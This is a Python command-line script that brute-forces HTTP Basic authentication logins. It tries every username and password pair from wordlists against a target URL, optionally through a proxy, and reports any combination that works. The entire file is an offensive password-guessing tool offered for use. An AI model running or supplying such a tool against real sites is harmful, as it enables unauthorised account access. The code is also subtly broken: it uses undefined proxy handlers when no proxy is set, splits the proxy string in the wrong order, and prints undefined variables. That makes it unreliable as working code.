import urllib.request
from urllib.error import URLError
import argparse

def prompt():
    """Prompt and parse arguments"""
    parser = argparse.ArgumentParser(
            prog='Minimal Bruteforce\n',
            description='Program uses urllib (built-in) to bruteforce login through Basic authentification workflow\n',
            epilog='skillz ~ minimal-software'
            )
    parser.add_argument("URL", help="top level url to bruteforce. This would be the first webpage requiring authentification (eg: https://www.example.com/admin).\n", type=str)
    parser.add_argument("-u", dest="usernames", help="path to username wordlist\n", type=str)
    parser.add_argument("-p", dest="passwords", help="path to password wordlist\n", type=str)
    parser.add_argument("-q","--quiet", help="quiet mode\n", action="store_true")
    parser.add_argument("-x", dest="proxy", help="proxy support (eg: http://example.com:9999)\n", type=str)
    args = parser.parse_args()
    if not args.usernames:
        args.usernames = input("Please specify path to usernames wordlist: ")
    if not args.passwords:
        args.passwords = input("Please specify path to passwords wordlist: ")
    return args
    #parser.add_argument('-a')  #api

def clean(ufile, pfile):
    """Cleaning the wordlists"""
    try:
        with open(pfile, "r") as p:
            passwords= p.readlines()
            passwords = list(map(lambda line: line.strip(), passwords))
    except:
        print("passwords file not found")
    
    try:
        with open(ufile, "r") as u:
            usernames = u.readlines()
            usernames = list(map(lambda line: line.strip(), usernames))
        return (usernames, passwords)
    except:
        print("usernames file not found")


def atk(u:list, p:list, url:str, q:bool, x=None):
    """minimal bruteforce atk"""
    # forming the request & attacking
    if not (u and p and url):
        return None
    password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm() 
    
    for username in u:
      for password in p:
        password_mgr.add_password(None, url, username, password) 
        handler = urllib.request.HTTPBasicAuthHandler(password_mgr) 
        if x:
            host,proto = x.split("://")
            proxy_handler = urllib.request.ProxyHandler({proto:host})
            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler()
            x_username = input("proxy username: ")
            x_password = input("proxy password: ")
            proxy_auth_handler.add_password(None, url,x_username,x_password)
        opener = urllib.request.build_opener(handler,proxy_handler,proxy_auth_handler)
        urllib.request.install_opener(opener)
        if not q:
            print(f'trying combo: {username} X {password}')
        try:
            response = urllib.request.urlopen(url, timeout=5)
            return (username, password)
        except URLError as e:      
            if hasattr(e, 'code'):
                print (f'Error code: {e.code}')
        except:
            print("Something is wrong with the URL or the proxy. Check if its under this format: protocole://url[.tld][:port]")
            return None
    print("username password combo not found!")

if __name__ == '__main__':
    args = prompt()
    cleaned = clean(args.usernames, args.passwords)
    if cleaned:
        usernames,passwords=cleaned
        creds = atk(usernames, passwords, args.URL, args.quiet, args.proxy)
        if creds:
            print(f"Combo found! {u}:{p}")
